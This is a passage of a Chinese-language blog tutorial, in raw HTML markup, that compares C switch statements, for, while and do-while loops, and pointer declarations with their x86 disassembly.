<span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">515</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D807 <span class=\"number\">74</span> <span class=\"number\">16</span>                je          func+<span class=\"number\">4F</span>h (<span class=\"number\">0040</span>d81f)</span><br><span class=\"line\"><span class=\"number\">0040</span>D809 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC BC <span class=\"number\">14</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">14B</span>Ch</span><br><span class=\"line\"><span class=\"number\">0040</span>D810 <span class=\"number\">74</span> <span class=\"number\">1</span>C                je          func+<span class=\"number\">5</span>Eh (<span class=\"number\">0040</span>d82e)</span><br><span class=\"line\"><span class=\"number\">0040</span>D812 EB <span class=\"number\">47</span>                jmp         func+<span class=\"number\">8B</span>h (<span class=\"number\">0040</span>d85b)</span><br><span class=\"line\"><span class=\"number\">0040</span>D814 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">56</span> <span class=\"number\">4F</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">4F</span>56h</span><br><span class=\"line\"><span class=\"number\">0040</span>D81B <span class=\"number\">74</span> <span class=\"number\">2F</span>                je          func+<span class=\"number\">7</span>Ch (<span class=\"number\">0040</span>d84c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D81D EB <span class=\"number\">3</span>C                jmp         func+<span class=\"number\">8B</span>h (<span class=\"number\">0040</span>d85b)</span><br><span class=\"line\"><span class=\"number\">0040</span>D81F <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D824 E8 <span class=\"number\">17</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D829 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D82C EB 3A                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D82E 68 28 20 42 00       push        offset string &quot;8&quot; <span class=\"params\">(<span class=\"number\">00422028</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D833 E8 08 39 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D838 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D83B EB 2B                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D83D 68 24 20 42 00       push        offset string &quot;9&quot; <span class=\"params\">(<span class=\"number\">00422024</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D842 E8 F9 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D847 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D84A EB 1C                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D84C 68 20 20 42 00       push        offset string &quot;A&quot; <span class=\"params\">(<span class=\"number\">00422020</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D851 E8 EA 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D856 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D859 EB 0D                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D85B 68 1C 20 42 00       push        offset string &quot;sb&quot; <span class=\"params\">(<span class=\"number\">0042201</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D860 E8 DB 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D865 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D868 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D869 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D86A 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D86B 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D86E 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D870 E8 4B 39 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D875 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D877 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D878 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//用case最大的-case最小的，得出的范围称为k，如果要判断的值-case最小的值不在范围k之内，直接default</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//edx 存放的是a 与case 中最小值的差值，而eax*4+地址存放的是每个case的地址</span></span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123120353631.png\" alt=\"image-20230123120353631\"></p>\n<h3 id=\"循环对比分析\"><a class=\"markdownIt-Anchor\" href=\"#循环对比分析\">#</a> 循环对比分析</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">10</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D920 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D921 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D923 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D926 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D927 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D928 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D929 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D92C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D931 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D936 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D938 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>\t\t\t\t\t\t\t;<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"number\">0040</span>D93F EB <span class=\"number\">09</span>                jmp         func2+<span class=\"number\">2</span>Ah (<span class=\"number\">0040</span>d94a)</span><br><span class=\"line\"><span class=\"number\">0040</span>D941 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D944 <span class=\"number\">83</span> C0 <span class=\"number\">01</span>             add         eax,<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D947 <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D94A <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah\t\t\t\t\t\t\t;i&lt;=<span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D94E <span class=\"number\">7F</span> <span class=\"number\">13</span>                jg          func2+<span class=\"number\">43</span>h (<span class=\"number\">0040</span>d963)\t\t\t\t\t\t\t;i&gt;<span class=\"number\">10</span>,ret</span><br><span class=\"line\"><span class=\"number\">0040</span>D950 <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]\t\t\t\t\t\t\t;i&lt;=<span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D953 <span class=\"number\">51</span>                   push        ecx\t\t\t\t\t\t\t\t\t\t\t;ecx = i</span><br><span class=\"line\"><span class=\"number\">0040</span>D954 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D959 E8 E2 <span class=\"number\">37</span> FF FF       call        <span class=\"built_in\">printf</span> (<span class=\"number\">00401140</span>)</span><br><span class=\"line\"><span class=\"number\">0040</span>D95E <span class=\"number\">83</span> C4 <span class=\"number\">08</span>             add         esp,<span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D961 EB DE                jmp         func2+<span class=\"number\">21</span>h (<span class=\"number\">0040</span>d941)</span><br><span class=\"line\"><span class=\"number\">0040</span>D963 <span class=\"number\">5F</span>                   pop         edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D964 <span class=\"number\">5</span>E                   pop         esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D965 <span class=\"number\">5B</span>                   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D966 <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D969 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D96B E8 <span class=\"number\">50</span> <span class=\"number\">38</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span><br><span class=\"line\"><span class=\"number\">0040</span>D970 <span class=\"number\">8B</span> E5                mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D972 <span class=\"number\">5</span>D                   pop         ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D973 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"built_in\">func3</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;=<span class=\"number\">10</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,i);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D980 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D981 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D983 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D986 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D987 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D988 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D989 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D98C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D991 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D996 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D998 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D99F <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A3 <span class=\"number\">7F</span> <span class=\"number\">1</span>C                jg          func3+<span class=\"number\">41</span>h (<span class=\"number\">0040</span>d9c1)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A5 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A8 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A9 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9AE E8 <span class=\"number\">8</span>D <span class=\"number\">37</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9B3 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D9B6 8B 4D FC             mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D9B9 83 C1 01             add         ecx,1</span></span><br><span class=\"line\"><span class=\"function\">0040D9BC 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D9BF EB DE                jmp         func3+1<span class=\"title\">Fh</span> <span class=\"params\">(<span class=\"number\">0040</span>d99f)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9C1 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C2 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C3 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D9C4 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D9C7 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D9C9 E8 F2 37 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9CE 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D0 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D1 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func4</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">while</span>(i&lt;=<span class=\"number\">10</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D980 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D981 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D983 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D986 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D987 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D988 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D989 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D98C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D991 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D996 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D998 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D99F <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A3 <span class=\"number\">7F</span> <span class=\"number\">1</span>C                jg          func3+<span class=\"number\">41</span>h (<span class=\"number\">0040</span>d9c1)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A5 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A8 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A9 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9AE E8 <span class=\"number\">8</span>D <span class=\"number\">37</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9B3 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D9B6 8B 4D FC             mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D9B9 83 C1 01             add         ecx,1</span></span><br><span class=\"line\"><span class=\"function\">0040D9BC 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D9BF EB DE                jmp         func3+1<span class=\"title\">Fh</span> <span class=\"params\">(<span class=\"number\">0040</span>d99f)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9C1 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C2 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D9C3 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D9C4 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D9C7 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D9C9 E8 F2 37 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9CE 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D0 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D9D1 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"指针\"><a class=\"markdownIt-Anchor\" href=\"#指针\">#</a> 指针</h3>\n<p>总结:<br>\n1、带有 <code>*</code>  的变量类型的标准写法: <code>变量类型* 变量名</code></p>\n<p>2、任何类型都可以带 <code>*</code>  加上 <code>*</code>  以后是新的类型</p>\n<p>3、* 可以是任意多个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//赋值</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Stu</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\">\tStu* stu;</span><br><span class=\"line\">\t<span class=\"type\">int</span>** a;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">3</span>;</span><br><span class=\"line\">\tstu = (Stu*)<span class=\"number\">4</span>;</span><br><span class=\"line\">\ta = (<span class=\"type\">int</span>**)<span class=\"number\">5</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743 <span class=\"number\">83</span> EC <span class=\"number\">54</span>             sub         esp,<span class=\"number\">54</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D746 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749 <span class=\"number\">8</span>D <span class=\"number\">7</span>D AC             lea         edi,[ebp<span class=\"number\">-54</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C B9 <span class=\"number\">15</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">15</span>h</span><br><span class=\"line\"><span 